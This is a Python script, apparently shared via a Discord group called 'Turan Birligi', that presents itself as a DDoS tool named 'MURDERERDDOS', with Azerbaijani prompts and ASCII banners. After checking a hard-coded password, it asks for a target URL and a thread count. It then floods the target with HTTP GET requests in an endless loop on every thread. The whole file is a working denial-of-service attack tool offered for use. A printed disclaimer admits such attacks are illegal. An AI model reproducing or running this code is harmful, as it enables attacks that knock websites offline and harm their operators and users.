OSError(" ") 
print("\33[33mBu ust Seviyye DDOSU Istifade Etmek Ucun Discord Kanalimizdan Password Al 1 Hefteden 1 Yenilenir @ Turan Birligi\33[0m")

password = "turan1212"

while True:
	pasword = input("\33[33mPasswordu girin: \33[0m")
	if password != pasword:
		print("\33[31mYanlis Password Discord Kanalindan Parolu Oyren @ Turan Birligi\33[0m")
		continue
	else:
		print("\33[32mGiris Edildi DDOS Yuklenir\33[0m")
		break
		
import requests		
import threading
import os

os.system("clear")

banner = """
\33[33m
 /$$      /$$ /$$   /$$ /$$$$$$$  /$$$$$$$  /$$$$$$$$ /$$$$$$$  /$$$$$$$$ /$$$$$$$  /$$$$$$$  /$$$$$$$   /$$$$$$   /$$$$$$        /$$$$$$$  /$$$$$$$$ /$$$$$$$$ /$$$$$$ 
| $$$    /$$$| $$  | $$| $$__  $$| $$__  $$| $$_____/| $$__  $$| $$_____/| $$__  $$| $$__  $$| $$__  $$ /$$__  $$ /$$__  $$      | $$__  $$| $$_____/|__  $$__//$$__  $$
| $$$$  /$$$$| $$  | $$| $$  \ $$| $$  \ $$| $$      | $$  \ $$| $$      | $$  \ $$| $$  \ $$| $$  \ $$| $$  \ $$| $$  \__/      | $$  \ $$| $$         | $$  | $$  \ $$
| $$ $$/$$ $$| $$  | $$| $$$$$$$/| $$  | $$| $$$$$   | $$$$$$$/| $$$$$   | $$$$$$$/| $$  | $$| $$  | $$| $$  | $$|  $$$$$$       | $$$$$$$ | $$$$$      | $$  | $$$$$$$$
| $$  $$$| $$| $$  | $$| $$__  $$| $$  | $$| $$__/   | $$__  $$| $$__/   | $$__  $$| $$  | $$| $$  | $$| $$  | $$ \____  $$      | $$__  $$| $$__/      | $$  | $$__  $$
| $$\  $ | $$| $$  | $$| $$  \ $$| $$  | $$| $$      | $$  \ $$| $$      | $$  \ $$| $$  | $$| $$  | $$| $$  | $$ /$$  \ $$      | $$  \ $$| $$         | $$  | $$  | $$
| $$ \/  | $$|  $$$$$$/| $$  | $$| $$$$$$$/| $$$$$$$$| $$  | $$| $$$$$$$$| $$  | $$| $$$$$$$/| $$$$$$$/|  $$$$$$/|  $$$$$$/      | $$$$$$$/| $$$$$$$$   | $$  | $$  | $$
|__/     |__/ \______/ |__/  |__/|_______/ |________/|__/  |__/|________/|__/  |__/|_______/ |_______/  \______/  \______/       |_______/ |________/   |__/  |__/  |__/
\33[0m
\33[32m
############################################    
# BY-THE KING OF THE GLORY(AnonimUser)     #    
# MURDERERDDOS                             #   
# HIGH-QUALITY -- YAZANDA HTTP,S ISLEDIN   #  
############################################    
\33[0m
"""
print(banner)


print("\33[33mSAYTA DDOS ATMAQ ILLEGALDIR VE SIZIN ATDIGINIZ DDOSLARA GORE BIZ MEHSULIYYET DASIMIRIQ\33[0m")

print("\33[31mWarning! Başladı.Komputerinizin gucune gore atack sayi yazin\33[0m")

url = input("[+] URL girin: ")

url1 = url

def ch(url):
    while True:
        session = requests.Session()
        session.headers.update({'User-Agent': 'Mozilla/5.0'})
        x = session.get(url)
        print(f"\33[31m HUCUM EDILIYOR----->\33[0m" ,url1, " Gonderilen Paket Hecmi: ", {x.status_code} )

thread_count = int(input("[+] Attack sayini gir: "))

for i in range(thread_count):
    ta = threading.Thread(target=ch, args=(url,), daemon=False)
    ta.start()